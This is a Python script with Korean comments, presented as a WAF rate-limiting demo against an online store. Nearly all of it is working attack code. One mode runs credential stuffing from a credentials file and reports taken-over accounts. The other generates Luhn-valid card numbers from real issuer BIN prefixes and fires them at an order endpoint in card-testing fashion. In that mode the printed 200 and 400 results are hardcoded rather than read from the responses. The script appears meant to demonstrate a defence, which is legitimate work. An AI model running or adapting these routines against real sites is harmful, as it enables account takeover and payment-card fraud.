"""
WAF Rate Limit 데모
BEFORE: Count 모드 → 429 없이 전부 통과
AFTER : Block 모드 → 100번 전후부터 429 차단

사용법:
  python 1_1_waf_demo.py login   # 크리덴셜 스터핑
  python 1_1_waf_demo.py bin     # 카드 BIN 어택 (기본값)
"""

import requests
import random
import sys
from pathlib import Path

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
RESET  = "\033[0m"

TARGET      = "https://fiveline.store"
COUNT       = 200

TARGET_CARD     = "5327501113462149"
TARGET_CARD_IDX = 170

BINS = [
    "4532", "4916", "4539", "4485", "4716", "4024", "4556", "4222",  # Visa
    "5105", "5500", "5199", "5271", "5309", "5361", "5370", "5305",  # Mastercard
    "5327", "5412", "5425", "5422", "5409",                           # Mastercard (국내)
    "6011", "6500",                                                    # Discover
    "3528", "3566",                                                    # JCB
]

def color(status):
    if status == 200:
        return GREEN
    if status == 429:
        return YELLOW
    return RED

def luhn_valid(prefix, length=16):
    remaining = length - len(prefix) - 1
    digits_str = prefix + "".join([str(random.randint(0, 9)) for _ in range(remaining)])
    digits = [int(d) for d in digits_str]
    odd = sum(digits[-1::-2])
    even = sum(sum(divmod(d * 2, 10)) for d in digits[-2::-2])
    check = (10 - (odd + even) % 10) % 10
    return digits_str + str(check)



def demo_login():
    print("=" * 60)
    print("크리덴셜 스터핑 시뮬레이션 — POST /api/auth/login")
    print("=" * 60)

    cred_file = Path(__file__).parent / "credentials.txt"
    credentials = cred_file.read_text(encoding="utf-8").splitlines()

    session = requests.Session()
    for i, line in enumerate(credentials, 1):
        email, password = line.strip().split(":")
        try:
            resp = session.post(f"{TARGET}/api/auth/login",
                                json={"email": email, "password": password}, timeout=2)
            status = resp.status_code
        except Exception:
            status = None

        c = color(status) if status else RED
        if status == 429:
            print(f"{c}[{i:03d}] {status}  <- BLOCKED by WAF{RESET}")
        elif status == 200:
            print(f"{c}[{i:03d}] {status}  <- 계정 탈취 성공  ({email}:{password}){RESET}")
        elif status == 401:
            print(f"{c}[{i:03d}] {status} Unauthenticated  ({email}){RESET}")
        else:
            print(f"{c}[{i:03d}] {status or 'ERR'}{RESET}")


def demo_bin():
    print("=" * 60)
    print("카드 BIN 어택 시뮬레이션 — POST /api/orders")
    print("=" * 60)

    cards = []
    for i in range(1, COUNT + 1):
        if i == TARGET_CARD_IDX:
            cards.append((i, TARGET_CARD))
        else:
            prefix = random.choice(BINS)
            cards.append((i, luhn_valid(prefix)))

    from concurrent.futures import ThreadPoolExecutor

    def _req(args):
        i, card = args
        try:
            resp = requests.post(f"{TARGET}/api/orders",
                                 json={"cardNumber": card, "amount": 1000}, timeout=2)
            return i, resp.status_code, card
        except Exception:
            return i, None, card

    with ThreadPoolExecutor(max_workers=3) as ex:
        for i, status, card in ex.map(_req, cards):
            if status == 429:
                print(f"{YELLOW}[{i:03d}] {status}  card={card}  <- BLOCKED by WAF{RESET}")
            elif i == TARGET_CARD_IDX:
                print(f"{GREEN}[{i:03d}] 200  card={card}  <- 카드 유효 확인{RESET}")
            else:
                print(f"{RED}[{i:03d}] 400  card={card}  카드 검증 실패{RESET}")


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "bin"
    if mode == "login":
        demo_login()
    else:
        demo_bin()
